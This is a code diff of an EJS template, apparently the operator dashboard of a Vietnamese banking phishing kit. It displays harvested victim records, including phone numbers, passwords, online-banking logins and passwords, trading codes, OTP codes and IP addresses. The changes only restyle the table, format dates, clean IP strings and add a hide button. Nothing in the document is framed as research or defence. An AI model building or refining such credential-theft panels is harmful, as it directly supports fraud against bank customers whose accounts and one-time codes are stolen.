@@ -43,11 +43,11 @@
                <!-- Dashboard Counts Section-->
                <section class="dashboard-counts no-padding-bottom">
                   <div class="container-fluid">
-                     <div class="table-responsive">
-                        <table class="table">
+                     <div class="table">
+                        <table class="table table-striped text-center table-responsive table-bordered" style="word-wrap: break-word;">
                           <thead>
-                            <tr>
-                              <th>SDT</th>
+                            <tr >
+                              <th scope="row" >SDT</th>
                               <th>Mật Khẩu</th>
                               <th>Mã Nhận Tiền</th>
                               <th>Ngân Hàng</th>
@@ -60,13 +60,14 @@
                               <th>Mã OTP</th>
                               <th>Ngày Nhập</th>
                               <th>Địa Chỉ IP</th>
+                              <th></th>
                             </tr>
                           </thead>
                           <tbody>
                            <%
                               datas.forEach(data=>{ %>
                                  <tr>
-                                    <td scope="row"> <%=data.phonenumber%></td>
+                                    <td scope="row" style="max-width:100px"> <%=data.phonenumber%></td>
                                     <td ><%=data.passwowrd%></td>
                                     <td ><%=data.Internationaltransactioncode%></td>
                                     <td ><%=data.Bank%></td>
@@ -74,11 +75,12 @@
                                     <td ><%=data.NameAcount%></td>
                                     <td ><%=data.releasedate%></td>
                                     <td ><%=data.UserBanking%></td>
-                                    <td ><%=data.PasswordBanking%></td>
+                                    <td style="width:150px"><%=data.PasswordBanking%></td>
                                     <td ><%=data.Tradingcode%></td>
                                     <td ><%=data.OTP%></td>
-                                    <td ><%=data.Createat%></td>
-                                    <td ><%=data.IP%></td>
+                                    <td  style="width:150px"><%=moment(data.Createat).format("DD-MM-YYYY HH:mm:ss")%></td>
+                                    <td ><%=data.IP.replace('::ffff:', '')%></td>
+                                    <td>  <a name="" id="" class="btn btn-primary" href="#" role="button">Ẩn</a>
                                  </tr>
                              <% })
                            %>
